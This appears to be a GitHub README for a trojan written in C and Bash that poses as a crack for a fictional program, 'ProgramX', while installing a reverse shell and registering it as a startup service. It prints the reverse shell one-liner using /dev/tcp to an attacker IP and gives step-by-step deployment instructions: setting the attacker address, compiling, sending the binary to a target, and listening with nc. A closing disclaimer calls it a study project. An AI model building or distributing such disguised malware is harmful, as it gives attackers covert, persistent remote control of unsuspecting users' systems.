# Trojan - Cracking Software
Basic trojan with command and control functionatilies for ubuntu based systems. This trojan was created for study porpuses only.

It emulates a scenario of a binarie that patches/cracks a ficticional legit software called ProgramX but inside has a malware. 
When the user download it, If he try to run it without admin privileges, it will not run and ask to be run again with admin privileges.
After being executed, the binarie will do it's legimitate work of patching/cracking ProgramX but will also install a reverse shell on the user's system.
The binare will create a shell script that runs the reverse shell and then add the first script as a service to be run at system startup. 

It was coded in C and Bash Scripting.

## How to use:

1 - Change the attacker IP Address and Port to connect in the source code (line 52).

```
bash -i >& /dev/tcp/attackerip/porttoconnect 0>&1 2>&1
```
2 - Compile code

3 - Download/Send the binarie to the target machine

4 - Give Read/Write/Execution permissions to the file

```
chmod +rwx programxpatch
```

5 - Open and listen to the port in your host (attacker host) using ncat or nc

6 - Run

![image](https://github.com/Smarttfoxx/softwarecracktrojan/assets/140526026/87100563-10fd-4327-bb0e-d1f37985f41f)

![Sem título](https://github.com/Smarttfoxx/softwarecracktrojan/assets/140526026/450d909f-1a69-4cf5-b82f-986c16c4a45a)


# DISCLAIMER

This binarie was created for only study porpuses, it was not and shouldn't be used against any third party without permission.
I am not responsible for any illegal ou bad use of the binarie.
